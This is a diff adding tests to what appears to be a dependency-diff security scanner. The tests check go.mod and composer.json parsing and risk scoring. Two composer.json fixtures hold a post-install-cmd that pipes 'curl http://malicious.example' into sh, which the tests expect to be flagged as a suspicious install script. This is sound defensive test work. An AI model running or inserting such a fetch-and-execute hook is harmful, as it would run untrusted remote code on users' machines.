@@ -6,6 +6,8 @@ from __future__ import annotations
 
 from watchgate.core.layers._shared import (
     parse_cargo_toml,
+    parse_composer_json,
+    parse_go_mod,
     parse_package_json,
     parse_pkgbuild,
     parse_requirements_txt,
@@ -113,6 +115,26 @@ def test_parsers() -> None:
     assert pkgbuild[0].name == "curl"
     assert pkgbuild[1].name == "openssl"
 
+    go_hunk = (
+        "+\n+require github.com/gin-gonic/gin v1.9.1\n"
+        "+replace github.com/foo/bar => ../local/foo\n"
+    )
+    go_mod = parse_go_mod(go_hunk)
+    assert len(go_mod) == 2
+    assert go_mod[0].name == "github.com/gin-gonic/gin"
+    assert go_mod[0].new_version == "v1.9.1"
+    assert go_mod[1].name == "github.com/foo/bar"
+    assert go_mod[1].is_direct_url is True
+
+    comp_hunk = (
+        '+\n "require": {\n+  "guzzlehttp/guzzle": "^7.8",\n'
+        '+  "post-install-cmd": "curl http://malicious.example | sh"\n }'
+    )
+    composer = parse_composer_json(comp_hunk)
+    assert len(composer) == 1
+    assert composer[0].name == "guzzlehttp/guzzle"
+    assert composer[0].new_version == "^7.8"
+
 
 def test_typosquat_checker() -> None:
     checker = TyposquatChecker()
@@ -216,3 +238,40 @@ def test_new_dependency_without_attack_signals_gets_baseline_score() -> None:
     assert res.risk_score == 10
     assert "vulnerabilidades" not in res.justification.lower()
     assert "sin señales de typosquatting" in res.justification.lower()
+
+
+def test_deps_layer_analyze_go_mod_and_composer() -> None:
+    layer = DepsLayer()
+    diff_go = _make_diff(
+        [
+            FileChange(
+                path="go.mod",
+                status=FileStatus.MODIFIED,
+                diff_hunk="@@ -1,0 +1,1 @@\n+require github.com/gin-gonic/gin v1.9.1",
+                additions=1,
+                deletions=0,
+            )
+        ]
+    )
+    res_go = layer.analyze(diff_go, {})
+    assert res_go.risk_score == 10
+    assert "github.com/gin-gonic/gin" in res_go.justification
+
+    comp_diff_hunk = (
+        '@@ -1,0 +1,2 @@\n+  "guzzlehttp/guzzle": "^7.8",\n'
+        '+  "post-install-cmd": "curl http://malicious.example | sh"'
+    )
+    diff_composer = _make_diff(
+        [
+            FileChange(
+                path="composer.json",
+                status=FileStatus.MODIFIED,
+                diff_hunk=comp_diff_hunk,
+                additions=2,
+                deletions=0,
+            )
+        ]
+    )
+    res_composer = layer.analyze(diff_composer, {})
+    assert res_composer.risk_score >= 80
+    assert "Script de instalación sospechoso" in res_composer.justification
